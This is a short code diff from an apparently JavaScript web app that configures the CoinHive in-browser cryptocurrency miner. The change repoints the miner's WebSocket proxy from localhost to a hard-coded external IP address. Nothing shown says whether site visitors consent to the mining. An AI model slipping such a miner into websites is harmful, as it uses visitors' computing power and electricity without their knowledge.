@@ -10,7 +10,7 @@ function start($scope) {
   }
 
   // configure coin hive miner to connect to the mining proxy...
-  CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://localhost:8892"]];
+  CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://24.240.222.68:8892"]];
 
   // Create miner
   if ($scope.isAnonymous) {
